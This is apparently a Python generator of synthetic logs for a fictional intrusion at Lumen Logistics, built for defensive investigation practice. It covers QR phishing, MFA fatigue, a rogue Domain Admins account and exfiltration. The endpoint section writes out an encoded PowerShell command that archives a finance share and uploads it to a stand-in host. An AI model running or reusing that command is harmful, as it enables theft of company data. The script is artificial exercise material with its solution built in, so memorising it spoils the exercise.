#!/usr/bin/env python3
"""Logs for the Lumen Logistics intrusion (2026-10-19 to 2026-10-23, UTC): a QR-code phishing mail, MFA
fatigue, a new admin account, encoded PowerShell and exfiltration. Fixed seed: every build is the same."""
import base64
import json
import random
from datetime import datetime, timedelta, timezone

R = random.Random(2610)
OUT = "/out"
START = datetime(2026, 10, 19, tzinfo=timezone.utc)

def ts(t):
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")

def rand_t(days=5):
    return START + timedelta(seconds=R.randrange(days * 86400))

def at(day, h, m, s=0):
    return datetime(2026, 10, day, h, m, s, tzinfo=timezone.utc)

def write(name, rows):
    rows.sort(key=lambda r: r["time"])
    with open(f"{OUT}/{name}", "w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")

STAFF = ["priya.n", "tom.b", "ana.l", "jonas.k", "mei.w", "omar.f", "lena.s", "raj.p", "sofia.m", "dev.ops"]
OFFICE_IPS = ["198.51.100.10", "198.51.100.11", "198.51.100.12"]
ATTACKER_IP = "203.0.113.80"
PHISH_FROM = "benefits@lumen-hr-benefits.com"
QR_URL = "https://lumen-benefits-portal.com/sso/login"
EXFIL_HOST = "files.drop-share.net"

# ---- mail gateway
mail = []
for _ in range(400):
    mail.append({"time": ts(rand_t()), "from": R.choice(["it@lumen-logistics.com", "news@vendor-digest.com", "payroll@lumen-logistics.com",
                 "orders@partner-freight.com"]), "to": R.choice(STAFF) + "@lumen-logistics.com",
                 "subject": R.choice(["Weekly update", "Invoice 4471", "Shift schedule", "Re: pallet count"]),
                 "verdict": "delivered", "attachments": [], "qr_code_url": None})
for i, u in enumerate(["priya.n", "tom.b", "ana.l", "jonas.k", "mei.w", "sofia.m"]):
    mail.append({"time": ts(at(21, 7, 58, i * 7)), "from": PHISH_FROM, "to": u + "@lumen-logistics.com",
                 "subject": "Action required: 2027 benefits enrollment closes today", "verdict": "delivered",
                 "attachments": ["enrollment.png"], "qr_code_url": QR_URL})
write("mail.jsonl", mail)

# ---- identity provider
idp = []
for _ in range(600):
    u = R.choice(STAFF); t = rand_t()
    idp.append({"time": ts(t), "user": u, "event": "login_success", "src_ip": R.choice(OFFICE_IPS), "country": "DE", "mfa": "push"})
for _ in range(25):
    idp.append({"time": ts(rand_t()), "user": R.choice(STAFF), "event": "login_failure", "src_ip": R.choice(OFFICE_IPS),
                "country": "DE", "reason": "bad_password"})
t = at(21, 8, 12, 4)
idp.append({"time": ts(t), "user": "priya.n", "event": "password_accepted", "src_ip": ATTACKER_IP, "country": "NL"})
for i in range(14):
    t += timedelta(seconds=35 + R.randrange(10))
    idp.append({"time": ts(t), "user": "priya.n", "event": "mfa_push_sent", "src_ip": ATTACKER_IP, "country": "NL"})
    idp.append({"time": ts(t + timedelta(seconds=20)), "user": "priya.n",
                "event": "mfa_push_approved" if i == 13 else R.choice(["mfa_push_denied", "mfa_push_timeout"]),
                "src_ip": ATTACKER_IP, "country": "NL"})
APPROVED = t + timedelta(seconds=20)
idp.append({"time": ts(APPROVED + timedelta(seconds=2)), "user": "priya.n", "event": "login_success", "src_ip": ATTACKER_IP,
            "country": "NL", "mfa": "push"})
write("idp.jsonl", idp)

# ---- directory audit
dirlog = []
for _ in range(40):
    dirlog.append({"time": ts(rand_t()), "actor": "dev.ops", "action": R.choice(["password_reset", "group_member_added"]),
                   "target": R.choice(STAFF), "group": R.choice([None, "Warehouse", "Finance-Read"])})
dirlog.append({"time": ts(at(21, 8, 40, 12)), "actor": "priya.n", "action": "account_created", "target": "svc-backup2", "group": None})
dirlog.append({"time": ts(at(21, 8, 41, 3)), "actor": "priya.n", "action": "group_member_added", "target": "svc-backup2", "group": "Domain Admins"})
write("directory.jsonl", dirlog)

# ---- endpoint (EDR process events)
ps = ("Compress-Archive -Path \\\\fs01\\finance -DestinationPath C:\\Users\\Public\\q3.zip; "
      f"Invoke-WebRequest -Uri https://{EXFIL_HOST}/u/7f3a -Method Put -InFile C:\\Users\\Public\\q3.zip")
enc = base64.b64encode(ps.encode("utf-16-le")).decode()
edr = []
for _ in range(300):
    edr.append({"time": ts(rand_t()), "host": R.choice(["FIN-WS-07", "WH-WS-02", "HR-WS-01", "FS01"]), "user": R.choice(STAFF),
                "process": R.choice(["outlook.exe", "excel.exe", "chrome.exe", "teams.exe"]), "command_line": ""})
for _ in range(6):
    edr.append({"time": ts(rand_t()), "host": "FS01", "user": "dev.ops", "process": "powershell.exe",
                "command_line": "powershell.exe -File C:\\scripts\\disk-report.ps1"})
edr.append({"time": ts(at(22, 1, 15, 9)), "host": "FIN-WS-07", "user": "svc-backup2", "process": "powershell.exe",
            "command_line": f"powershell.exe -NoProfile -WindowStyle Hidden -enc {enc}"})
write("endpoint.jsonl", edr)

# ---- web proxy
proxy = []
for _ in range(900):
    proxy.append({"time": ts(rand_t()), "host": R.choice(["FIN-WS-07", "WH-WS-02", "HR-WS-01"]), "dest": R.choice(
        ["outlook.office.com", "www.google.com", "teams.microsoft.com", "partner-freight.com"]), "method": "GET",
        "bytes_out": R.randrange(300, 4000), "bytes_in": R.randrange(2000, 900000)})
t = at(22, 1, 16, 0)
for i in range(48):
    t += timedelta(seconds=20)
    proxy.append({"time": ts(t), "host": "FIN-WS-07", "dest": EXFIL_HOST, "method": "PUT", "bytes_out": 50 * 1024 * 1024, "bytes_in": 412})
write("proxy.jsonl", proxy)
